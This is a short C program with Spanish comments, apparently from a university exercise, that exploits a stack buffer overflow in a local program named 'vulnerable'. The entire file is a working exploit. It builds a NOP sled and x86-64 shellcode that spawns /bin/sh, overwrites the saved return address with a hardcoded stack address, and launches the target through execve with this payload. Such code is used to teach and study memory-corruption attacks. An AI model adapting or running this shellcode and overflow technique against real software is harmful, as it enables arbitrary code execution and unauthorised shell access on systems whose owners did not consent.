#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>


int main() {

    // Dirección de la pila donde se va a almacenar el buffer
    unsigned long retAddrHex = 0x00007fffffffec30;

    // Shellcode que queremos ejecutar, /bin/sh para spawnear una shell.
    char shellcode[] = "\x48\x31\xc0\xb0\x3b\x48\x31\xff\x57\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x0f\x05";

    // Buffer donde se va a almacenar el payload para pasar como parámetro al programa vulnerable
    // Tamaño de 80 bytes porque tenemos que escribir el buffer y sobreescribir el rbp (o sfp) y ret.
    char payload[80];

    // Llenar el payload con NOPs
    memset(payload, '\x90', 80);

    // Copiar el shellcode después de 10 bytes de NOPs
    memcpy(payload + 10, shellcode, strlen(shellcode));

    // Sobrescribir la dirección de retorno (little-endian)
    memcpy(payload + 72, &retAddrHex, sizeof(retAddrHex));// &ret_addr, sizeof(ret_addr));

    // Parámetros de execve
    char *args[] = { "/home/user1/Escritorio/practica2/ejShellLocal/vulnerable", payload, NULL };
    char *env[] = { NULL };

    // Ejecutar el programa vulnerable con nuestro payload
    execve(args[0], args, env);

    return 1;
}
